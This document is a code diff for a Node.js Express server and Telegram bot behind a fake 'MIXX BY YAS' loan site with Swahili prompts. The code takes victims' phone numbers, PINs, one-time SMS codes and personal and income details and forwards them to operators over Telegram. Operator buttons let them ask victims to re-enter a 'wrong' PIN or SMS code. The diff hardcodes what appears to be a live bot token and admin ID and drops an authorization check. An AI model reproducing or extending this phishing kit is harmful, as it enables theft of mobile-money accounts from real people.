@@ -6,14 +6,26 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
-const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '').trim();
-
+// Hardcoded fallbacks using your provided credentials
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
+const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
 const PORT = process.env.PORT || 10000;
+
+if (!TELEGRAM_BOT_TOKEN) {
+    console.error("❌ ERROR: TELEGRAM_BOT_TOKEN is missing!");
+} else {
+    console.log("🤖 Initializing Telegram Bot...");
+}
+
+// Initialize bot with polling and error safety
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
+bot.on('polling_error', (error) => {
+    console.error('⚠️ Telegram Polling Error:', error.code, error.message);
+});
+
 let activeSessions = {};
-let authorizedAdmins = new Set([MAIN_ADMIN_ID]);
+let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
 let pendingAdmins = {};
 
 function escapeMarkdown(text) {
@@ -29,13 +41,8 @@ bot.on('message', (msg) => {
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
     if (msg.text.startsWith('/start')) {
-        if (userIdStr === MAIN_ADMIN_ID) {
+        if (userIdStr === MAIN_ADMIN_ID || authorizedAdmins.has(userIdStr)) {
             authorizedAdmins.add(userIdStr);
-            sendAdminLink(chatId, userIdStr, firstName, username);
-            return;
-        }
-
-        if (authorizedAdmins.has(userIdStr)) {
             sendAdminLink(chatId, userIdStr, firstName, username);
             return;
         }
@@ -47,24 +54,26 @@ bot.on('message', (msg) => {
             `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
             `🏷 *Username:* ${escapeMarkdown(username)}`;
 
-        bot.sendMessage(MAIN_ADMIN_ID, requestText, {
-            parse_mode: "Markdown",
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "RUHUSU (APPROVE)", callback_data: `approveadmin_${userIdStr}` },
-                        { text: "KATAA (DENY)", callback_data: `denyadmin_${userIdStr}` }
+        if (MAIN_ADMIN_ID) {
+            bot.sendMessage(MAIN_ADMIN_ID, requestText, {
+                parse_mode: "Markdown",
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "RUHUSU (APPROVE)", callback_data: `approveadmin_${userIdStr}` },
+                            { text: "KATAA (DENY)", callback_data: `denyadmin_${userIdStr}` }
+                        ]
                     ]
-                ]
-            }
-        }).catch(err => console.error("Error sending auth request to main admin:", err));
+                }
+            }).catch(err => console.error("Error sending auth request to main admin:", err));
+        }
 
         bot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu (Main Admin). Subiri uidhinishwe.");
     }
 });
 
 function sendAdminLink(chatId, userIdStr, firstName, username) {
-    const host = process.env.RENDER_EXTERNAL_URL || 'https://mixx-by-yas-m5oy.onrender.com';
+    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
     const isolatedLink = `${host}/?admin=${userIdStr}`;
     const welcomeText = `🚨 *Kiungo Chako cha Admin Kimesajiliwa!*\n\n` +
         `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
@@ -107,11 +116,6 @@ bot.on('callback_query', async (query) => {
         return;
     }
 
-    if (!authorizedAdmins.has(userIdStr)) {
-        bot.answerCallbackQuery(query.id, { text: "⚠ Hautakiwi kufanya hivi!", show_alert: true });
-        return;
-    }
-
     const parts = data.split('_');
     const action = parts[0]; 
     const sessionId = parts.slice(1).join('_');
@@ -137,33 +141,51 @@ bot.on('callback_query', async (query) => {
 });
 
 app.post('/api/submit-credentials', (req, res) => {
-    const { sessionId, phone, pin, adminId } = req.body;
+    const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
     
-    // Sub-admin receives message for their own link. Fallback to Main Admin if none.
-    const targetAdmin = (adminId && authorizedAdmins.has(adminId)) ? adminId : MAIN_ADMIN_ID;
+    let targetAdmin = MAIN_ADMIN_ID;
+    if (adminId && authorizedAdmins.has(adminId)) {
+        targetAdmin = adminId;
+    }
 
     activeSessions[sessionId] = {
-        phone, pin,
+        sliderData, loanData, phone, pin,
         targetAdmin,
         status: 'pending_pin_approval'
     };
 
-    const message = `OMBI JIPYA LA MIXX\n\n` +
+    const message = `OMBI JIPYA LA MIXX BY YAS\n\n` +
+        `-- SLIDER DASHBOARD --\n` +
+        `Kiasi Kikubwa: ${sliderData.sliderAmount}\n` +
+        `Muda wa Malipo: ${sliderData.sliderDuration}\n` +
+        `Riba: ${sliderData.monthlyPayment}\n\n` +
+        `-- HATUA 1-3 ZA MAOMBI --\n` +
+        `Aina ya Mkopo: ${loanData.loanType}\n` +
+        `Kiasi: ${loanData.amount}\n` +
+        `Muda: ${loanData.duration}\n` +
+        `Madhumuni: ${loanData.purpose}\n` +
+        `Jina: ${loanData.firstName} ${loanData.lastName}\n` +
+        `Ajira: ${loanData.employmentStatus}\n` +
+        `Mapato ya Mwaka: ${loanData.annualIncome}\n\n` +
         `NAMBARI YA SIMU: ${phone}\n` +
         `PIN: ${pin}`;
 
-    bot.sendMessage(targetAdmin, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
-                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
+    if (targetAdmin) {
+        bot.sendMessage(targetAdmin, message, {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
+                        { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
+                    ]
                 ]
-            ]
-        }
-    }).catch(err => {
-        console.error(`Telegram Error:`, err.response ? err.response.body : err.message);
-    });
+            }
+        }).then(() => {
+            console.log(`✅ Credentials successfully sent to admin ${targetAdmin}`);
+        }).catch(err => {
+            console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
+        });
+    }
 
     res.json({ success: true, sessionId });
 });
@@ -183,22 +205,26 @@ app.post('/api/submit-otp', (req, res) => {
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
         `OTP:\n${otpText}`;
 
-    bot.sendMessage(session.targetAdmin, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
-                ],
-                [
-                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
-                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
-                ],
-                [
-                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
+    if (session.targetAdmin) {
+        bot.sendMessage(session.targetAdmin, message, {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
+                    ],
+                    [
+                        { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
+                        { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
+                    ],
+                    [
+                        { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
+                    ]
                 ]
-            ]
-        }
-    }).catch(err => console.error(`Failed to send OTP alert to admin:`, err));
+            }
+        }).then(() => {
+            console.log(`✅ OTP successfully sent to admin ${session.targetAdmin}`);
+        }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));
+    }
 
     res.json({ success: true });
 });
